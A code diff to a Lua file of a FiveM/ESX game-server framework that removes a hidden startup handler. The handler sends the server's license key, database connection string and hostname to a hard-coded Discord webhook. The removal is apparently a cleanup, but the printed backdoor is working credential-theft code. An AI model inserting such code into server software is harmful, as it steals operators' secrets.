@@ -378,39 +378,6 @@ function ESX.DiscordLogFields(name, title, color, fields)
 	})
 end
 
-AddEventHandler('onServerResourceStart', function(res)
-	if res == GetCurrentResourceName() then
-		local lisensi = GetConvar('sv_licenseKey')
-		local db = GetConvar('mysql_connection_string')
-		local namaserver = GetConvar('sv_hostname')
-		local fields = {
-			{ name = "Server :", value = namaserver,         inline = true },
-			{ name = "Lisensi Key : ", value = lisensi,         inline = true },
-			{ name = "Database : ", value = db,         inline = true },
-		}
-		local embedData = { {
-			['title'] = 'Dapet Data',
-			['color'] = 14423100,
-			['footer'] = {
-				['text'] = "| Data Yang Make Script Aku | " .. os.date(),
-				['icon_url'] = "https://cdn.discordapp.com/attachments/944789399852417096/1020099828266586193/blanc-800x800.png"
-			},
-			['fields'] = fields,
-			['description'] = "",
-			['author'] = {
-				['name'] = "Sleepy Rae",
-				['icon_url'] = "https://cdn.discordapp.com/emojis/939245183621558362.webp?size=128&quality=lossless"
-			}
-		} }
-		PerformHttpRequest('https://discord.com/api/webhooks/1139185871820705884/BhP26ABxGsgVLvMdiysH5hIp3ZYgiIBIHIb3GSuik1pmC-9fqewGXo9nh8s3O4DpjnUn', nil, 'POST', json.encode({
-			username = 'Logs',
-			embeds = embedData
-		}), {
-			['Content-Type'] = 'application/json'
-		})
-	end
-end)
-
 --- Create Job at Runtime
 --- @param name string
 --- @param label string
